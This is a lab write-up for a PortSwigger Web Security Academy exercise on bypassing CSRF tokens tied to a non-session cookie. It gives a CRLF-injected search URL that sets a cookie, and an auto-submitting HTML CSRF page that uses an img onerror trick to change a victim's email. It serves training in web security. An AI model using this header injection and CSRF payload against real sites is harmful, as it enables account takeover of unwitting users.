# Lab Writeup: CSRF where token is tied to non-session cookie

URL: https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

## Description

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

## Solution

1. Login using one of the above accounts
2. Try changing the email and intercept using burp, notice that there is `csrfKey` in the cookie also `csrf` in the body:

   Save both of them and drop the request so that they could be used in our exploit (1 time use only)

3. Login using a different account and try using the search bar in homepage, we could see that we have the following URL after search: `https://0ac600770493a5e68306ab36005c0083.web-security-academy.net/?search=test` we could try using the following search path parameter to change the `csrfKey` cookie: `/?search=test%0d%0aSet-Cookie:%20csrfKey=MWxqEVpxh43OQXFGf1cYZCURMialuclc%3b%20SameSite=None`:

4. Create the CSRF payload:

   ```html
   <!DOCTYPE html>
   <body>
     <form
       action="https://0a3d0072049c289d80543f5400cb000a.web-security-academy.net/my-account/change-email"
       method="POST"
     >
       <input
         type="hidden"
         name="csrf"
         value="hFn07BhpqJVH8r0xzxl0zo9aFF0E4equ"
       />
       <input type="email" name="email" value="hacker@gmail.com" />
     </form>
     <img
       src="https://0a3d0072049c289d80543f5400cb000a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=GO9RcQunsLfH50qCnia5kdIHT4ER0oQI%3b%20SameSite=None"
       alt=""
       onerror="document.forms[0].submit()"
     />
   </body>
   ```

   note that from the above html script, the `<img ... />` tag changes the `csrfKey` then upon error, it submits the form payload

5. Store and deliver exploit to victim, the lab should be solved:
   ![csrf-tied-token](/assets/csrf-tied-token.png)
